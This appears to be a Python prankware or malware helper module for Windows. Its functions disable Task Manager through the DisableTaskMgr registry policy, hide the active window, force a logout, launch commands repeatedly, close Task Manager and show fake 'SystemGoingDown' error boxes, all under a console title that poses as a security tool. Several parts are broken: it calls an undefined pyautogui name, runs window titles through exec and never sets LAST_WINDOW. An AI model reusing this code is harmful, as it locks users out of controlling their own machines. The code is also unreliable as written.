import win32api
import win32console
import win32con
import win32gui
import winreg
import pyautogui as pat
from threading import Thread
from win32 import *

LAST_WINDOW = 0

create_enumHandler = """
def winEnumHandler( hwnd, ctx ):
    if win32gui.IsWindowVisible( hwnd ):
        a = (hex(hwnd), win32gui.GetWindowText( hwnd ))
        exec(f"q = {a[0]}",globals())
        if %s in a[1]:
            win32gui.ShowWindow((q), win32con.SW_MAXIMIZE)

win32gui.EnumWindows( winEnumHandler, None )
"""

_find_windowG = """
def winEnumHandler( hwnd, ctx ):
    if win32gui.IsWindowVisible( hwnd ):
        a = (hex(hwnd), win32gui.GetWindowText( hwnd ))
        exec(f"q = {a[0]}",globals())
        if %s in a[1]:
            LAST_WINDOW = q

win32gui.EnumWindows( winEnumHandler, None )
"""

def find_windowG(gname):
    exec(_find_windowG % gname)
    return LAST_WINDOW

maxX, maxY = pyautogui.size()

def hidden():
    pid = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(pid,SW_HIDE)
#hidden()

def max_win(window_name):
    exec(create_enumHandler % window_name)

def run_command(command,n=1): # runs command but no cares like threading but better -> open notepad for 10 times
    for i in range(n):
        win32api.WinExec(command)


def disable_task_manager():
    # Path to the explorer properties
    registry_path: str = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    # Name of the key
    registry_name: str = "DisableTaskMgr"
    # Value that the registry key is set to
    value: int = 1
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
        winreg.CloseKey(reg_key)
    except WindowsError as e:
        print("There was an error setting the registry key {}".format(e))


def UserLogOut():
    win32api.ExitWindows()


def FindExecutableFile(executableFileName):
    win32api.FindExecutable(executableFileName)

def close_window(handle):
    win32gui.PostMessage(handle,win32con.WM_CLOSE,0,0)

def set_foreground_window(handle):
    win32gui.SetForegroundWindow(handle)
def set_cur_pos(x,y):
    win32api.SetCursorPos(x,y)

def find_window(name):
    return win32gui.FindWindow(None,name)
def msgbox(title,text,type=16):
    win32api.MessageBox(0,title,text,type)


################## HELP
#  win32api.GetCursorPos() -> Gets Position of mouse like (1012,534)
#  win32api.MessageBox(0,'HAHAHA','SystemGoingDown',16) -> Shows a message box with 16 error
#  win32api.SetCursorPos(1020,213) -> sets cursor position to (1020,213)
#  win32gui.FindWindow(None,r'Task Manager')
#  win32gui.SetForegroundWindow(handle) -> handle = win32gui.FindWindow(None,r'Task Manager')
#  win32gui.PostMessage(handle,win32con.WM_CLOSE,0,0) -> Close handle window if want to close task manager need permision


win32console.SetConsoleTitle("NanoGramSecurity\\ BANANA_SECURITY")

